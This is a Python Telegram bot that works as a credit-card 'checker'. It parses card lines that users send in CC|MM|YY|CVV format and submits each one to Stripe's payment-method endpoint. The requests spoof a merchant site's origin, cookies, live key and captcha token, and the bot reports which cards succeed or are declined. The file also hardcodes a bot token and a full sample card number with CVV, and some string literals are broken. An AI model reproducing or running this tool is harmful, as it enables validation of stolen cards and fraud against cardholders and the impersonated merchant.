import telebot
import requests
import time
import threading
import re
import random

# Replace with your Telegram bot token
TOKEN = '7621706011:AAE8N5F-uz1CNQ2T4QrXqKP7sTxuSeM-YgE'

bot = telebot.TeleBot(TOKEN)

# Data structures to manage user sessions
user_sessions = {}

# Helper regular expressions for input validation
CARD_PATTERN = re.compile(
    r'(\d{13,19})[|/ ]?\s*(\d{1,2})[|/ ]?\s*(\d{2,4})[|/ ]?\s*(\d{3,4})'
)

# Function to generate a random email
def generate_email():
    user = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
    return f"{user}@gmail.com"

# Function to parse user input card data
def parse_card_input(text):
    # Try to match with regex
    match = CARD_PATTERN.search(text)
    if not match:
        return None
    number, month, year, cvv = match.groups()

    # Normalize data
    number = number.strip()
    month = month.zfill(2)
    year = year.strip()
    if len(year) == 2:
        year = '20' + year
    elif len(year) == 4:
        year = year
    else:
        return None

    cvv = cvv.strip()

    # Validate numeric
    if not (number.isdigit() and month.isdigit() and year.isdigit() and cvv.isdigit()):
        return None

    return {
        'number': number,
        'exp_month': month,
        'exp_year': year,
        'cvc': cvv
    }

# Function to get 'pm_' from first URL response
def get_payment_method_id():
    url = 'https://api.stripe.com/v1/payment_methods'
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://app.theruletool.com',
        'Referer': 'https://app.theruletool.com/signup/create',
        'Cookie': '__stripe_mid=d65fe94e-d022-4554-9add-09e6aa20fc9c3832b6; __stripe_sid=07be667a-e9c7-454b-bab4-1c1123b2e51b495d68'
    }
    data = {
        'type': 'card',
        'billing_details[email]': generate_email(),
        'billing_details[name]': 'John Doe',
        'billing_details[phone]': '(314) 474-6658',
        'card[number]': '5402053964361036',
        'card[cvc]': '133',
        'card[exp_month]': '11',
        'card[exp_year]': '27',
        'guid': 'df1cb213-3b8d-40b5-861d-b78e6fbb086a883b59',
        'muid': 'd65fe94e-d022-4554-9add-09e6aa20fc9c3832b6',
        'sid': '07be667a-e9c7-454b-bab4-1c1123b2e51b495d68',
        'payment_user_agent': 'stripe.js/9e39ef88d1; stripe-js-v3/9e39ef88d1; card-element',
        'referrer': 'https://app.theruletool.com',
        'time_on_page': '32574',
        'key': 'pk_live_IEQsNdUrbZuQsRHI0yPFlzwM00D623ymrA',
        'radar_options[hcaptcha_token]': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiVmdQZFJwRjhFUjhuU2t6V2h6bjdtZklPNzliOGZJVFBpcnFoUTJXQWJtRG4rSEFHNVQwcTVoZFU2WlRlVDZ6NGNGMEUrdWpWbWVRbnVkWVBueEM1R0pGNEZLdU44Y2crcHBpZ3Uza00zNFpxMUdFWnV2eEpnY2pJeVFUTlBrR3VBVVI0anArb3R5RTdsMDJtVjZ0SFpkbXJvSEs1QVBDY3BOSVMwdFZSMUk2cFRtS3RDTUtKZEJNSlp3VVdHc1pseVlwcEsxYkVyampjUFVSTk9sK1RuUUZsbTROY0ZtNkRGT0trT0VaQVZCNERjbG45RDE4RGU1b1M5MlYxMXZyUWx6bTYvdXRaRDhGRTV4VGQyY01CbXR3WjlUclBwNjBsaXREcC8xbmxRSlNqaG93ekZSM1lzNkpZVFozRTlHTENZL3lseXNXclFaZE10M2FyNnd0RkhmNXZvUWI5UjZkb3FmYUNUT0c1b1M0MjluYzlDZmF4MVpuRTMzenJOdlZNQmFxUERxQ2VGb3Vmc2FBTlhiNnAwbXIwa0Zib3pCZ1NuM0dyaWdvVC9zbDIzSDQvekt2SWtpL0s0cTVhdG5XZXNjcVprMmJwU0hLS0IwTUUvT21Oc1ZEVWdGNUpvNEhLb0wzdlZhaSs3WWVZMTVnOFNFUElVNERKVlppTmMzQ2tKWFlDSWI3NjJmdzUyaHdWWjRWalBtdElZZXM3R0loWUJxRjJJazRLZXl2ME8wZ1JOME5MOXUvU2orWFg4SzcrVjVYMXBzdkJWb1BKS1RYWjI0SHlpYkVUQUtoNEduZml2UEVWcnZtdC83N2ZmakhYUzhCck4wc2dzWkhqUDVKZzN0ZkxWZ2N0SjR5WmxkdHVRNHV3VnB4WGZocjQ3K3hOWjBjU0hVbVZYNDBMelBwOUpMa1NCUDl3WjhlTHZlQ2VYMHMzTVd5YjZ0eUgwU3o0c01xZEJQeGJjTjVCaVRyQ0JSNmcvaG8zSVluSjVIWGF6dmJVL2NxOVFndHVlLzNOVEgxR3BWc0xWaXdVaDBPQUVIS3Q1UXBDTFZEZlQvenNNb2Z1WnFuSlcvakxXVUxaNkxOTjQxQkg4eXBFSHZ0SlVhSlpMb2J1N3dVcE5KNWVRV0J2cVpnaUJnRE5NclFCUm8xUGhtdFE5aFZXYmpMRTBHRmM1ZXFsd3JGYzMwR1Z3amlwcTBYb2lvOWRXNCtNT2xpakZkdlRGNytSRFRqSmJseWlLSmpBVVp2NjVRT2txMkFNMzVRcjFIMElvdW5mVmJuZFZLaVlLMHpGK09tSWUwdEVHN0k4T2pzZFR3a0hJSmh6SlVrZ081Q0Z1YmJ5dWRnNVc0ZDR3OEk3TlhUdk1MYzNpOE9WVnFOc09oWVVSMnprRWxIK0NLNFduWEtFTzBGcmlCSjhKdTBHME9ES0NlS1EvU1hxa2hPdXhxazRtd2NxL25QVm41bnI0Rnk2QmRkTlQzYS81K3BIZWZPSlkwbE9hL0RyV1FxcnRRYVg4NXFqampZeUpETVhxeFJPcm9YSngvNm9iRHYyTW01eVdGamFtZEx3TWJ2NG1NVVFlYnRhUi9vYzQ2bUczS2tMYVNjb2o0MVpuRWdvSnBIRFBvMXZrSUVRRngxTG12b3BiRUtmYnAxWmdrYWFUcWxkek84cjRORGc3SWsyRkJ5K3VINERBb1FvMWNsakdVYm81b2ZIbFM4Q2tIQXZmQ3J2VXpHVGtOb1UxTW1jaE41Mnlva1kra0JJUjNrdUpOUWVlZEhVbHRQTUlNcHY5STJzMmIxUndsSExCRHZNWnQyd1F5b3VyNDZRMUt0bTZmNlZqdEZOVjM5dWJWZjBReVYwMWtESzZtbTB5Y0MzTThTeWlrUXljODdheUlRQysya3RyMDA0d2JqM3g0Qnk2UVA2V0JzeDNyT09ZQUxubTVLYzVkaFZmemtsOGlCT3IzK2xpSStyUCtBQW9IWGYzUXlIOXEyK3BTRExnNEw1YkpRYUhENmtEN0FxeVpJVjRENFZPTUNwZ2JqVW5yOTlyKzJ4bENCQzdjZW1QbGsxZ3BCRTZveXVSN2lZdVRSVFQwZnpIQUVGTGFZekptM1lVRERxNlBGREdqRmpiczEyYzJ6SWpWVWw1NE9PSjhBdmVpRytQR2hJR0FpUTdsQTdVbHd3S1dNVkpqdS9rK3M1TXkycEptUHpFZldSaHBEQXYxVTlPRzhVTFZBeEVOWkp4MEt3eGJ6d3kwVnFvdWtVSkFZSXBUVXhwZitvT1VJS2ZheEtBYWxCTGg2VkdrMnlZWmVJTE83YVIrbUljUW1WT3lRanEzb0RMM0lmU2tYRUhqOW5Kbkx6MEJwaGQ1MEVueG9CcitZQldKNUhPRHFCVUZQUGN2Y3RqWkkyZExzV0h6TU9UK3QwL0tqOVJZajJHeEhET09BQXk4V2taeVN0bVhDS1o3anJ2NC9MSVZpRHBaMU1rVHFNM1BtWVhyUllFZGJUKzdYaEIxY2tVQnVNeElJL2Q2azBOY1AyTytFaG15TTZoZzViZU9PTXJCYlE4OTBReUMxc2plNzVWcjExUDBGb1E5emVhUjVCcFQ0WjNFeVEyNjBaRG1hYjhTcWZ5bkw2NTh1NHhGb1Z5eWs4YVVzOHF2Z0dpK3M3Vzh5K0lmV3JmcjVXempXVlg4ZC9LaGNiQjdVMDdKYjh0ZXBBS2x4ZVlSSXY3cSswWTFCRm90WEo0M2Z5NytrYzNDVzFxUnFBcnBrVFlGZXNONVB3NmVna2FsRDgwVVl1U1UvaUVlUmV3VlVnY0xqMXUwVXdWWFI5ZjBhRFdDMURiWm9rRnhNMnZzN2FLUE9VZVMrY05GaDFkWGpEeFNERTZaUDY3Z2xFRFBHVUFtRTBrQT09'
    }
    try:
        response = requests.post(url, headers=headers, data=data, timeout=15)
        return response.json()
    except Exception as e:
        return {'error': str(e)}

# Function to perform the check for a single card
def check_card(user_id, card_info):
    session = user_sessions.get(user_id)
    if not session:
        return

    # Prepare data payload
    pm_id = session.get('pm_id')
    if not pm_id:
        # Fetch pm_id if not available
        resp = get_payment_method_id()
        if 'id' in resp:
            pm_id = resp['id']
            session['pm_id'] = pm_id
        else:
            bot.send_message(user_id, "Failed to retrieve payment method ID.")
            return

    # Construct final URL
    url = 'https://api.stripe.com/v1/payment_methods'

    # Prepare POST data
    email = generate_email()
    post_data = {
        'type': 'card',
        'billing_details[email]': email,
        'billing_details[name]': 'John Doe',
        'billing_details[phone]': '(314) 474-6658',
        'card[number]': card_info['number'],
        'card[cvc]': card_info['cvc'],
        'card[exp_month]': card_info['exp_month'],
        'card[exp_year]': card_info['exp_year'],
        'pm_' : pm_id
        # Add other fields if needed
    }

    # Send request
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://app.theruletool.com',
        'Referer': 'https://app.theruletool.com/signup/create',
        'Cookie': '__stripe_mid=d65fe94e-d022-4554-9add-09e6aa20fc9c3832b6; __stripe_sid=07be667a-e9c7-454b-bab4-1c1123b2e51b495d68'
    }

    try:
        response = requests.post(url, headers=headers, data=post_data, timeout=15)
        resp_json = response.json()
        # Show full response
        if resp_json.get('IsSuccess') == True:
            bot.send_message(user_id, f"✅ Success:\nResponse: {resp_json}")
        else:
            bot.send_message(user_id, f"❌ Declined or Error:\nResponse: {resp_json}")
    except Exception as e:
        bot.send_message(user_id, f"Error: {str(e)}")

# Threaded function to process multiple cards with delay
def process_cards(user_id, cards):
    session = user_sessions.get(user_id)
    if not session:
        return
    session['checking'] = True
    for card in cards:
        if not session.get('checking'):
            break
        check_card(user_id, card)
        time.sleep(15)  # delay between checks
    bot.send_message(user_id, "Checking completed.")
    session['checking'] = False

# Command handler for /start
@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.chat.id
    user_sessions[user_id] = {
        'checking': False,
        'thread': None,
        'pm_id': None
    }
    bot.send_message(
    user_id,
    "Welcome! Send me credit card info in formats like:\n"
    "CC|MM|YY|CVV
"
    "CC|MM|YYYY|CVV
"
    "CC/MM/YY/CVV
"
    "CC/MM/YYYY/CVV
"
    "You can send multiple cards separated by new lines."
)

bot.send_message(user_id, "Send /stop to stop checking.")

# Command handler for /stop
@bot.message_handler(commands=['stop'])
def handle_stop(message):
    user_id = message.chat.id
    session = user_sessions.get(user_id)
    if session and session.get('checking'):
        session['checking'] = False
        if session.get('thread') and session['thread'].is_alive():
            session['thread'].join()
        bot.send_message(user_id, "Stopped checking.")

# Message handler for user input
@bot.message_handler(func=lambda m: True)
def handle_message(message):
    user_id = message.chat.id
    session = user_sessions.get(user_id)
    if not session:
        user_sessions[user_id] = {
            'checking': False,
            'thread': None,
            'pm_id': None
        }
        session = user_sessions[user_id]

    if session.get('checking'):
        bot.send_message(user_id, "Currently checking cards. Send /stop to halt.")
        return

    text = message.text.strip()
    lines = text.splitlines()
    cards = []

    for line in lines:
        parsed = parse_card_input(line)
        if not parsed:
            bot.send_message(user_id, f"Invalid format: {line}")
            continue
        cards.append(parsed)

    if not cards:
        bot.send_message(user_id, "No valid cards found.")
        return

    # Start processing in a new thread
    thread = threading.Thread(target=process_cards, args=(user_id, cards))
    thread.start()
    session['thread'] = thread
    session['checking'] = True

# Run the bot
bot.polling()
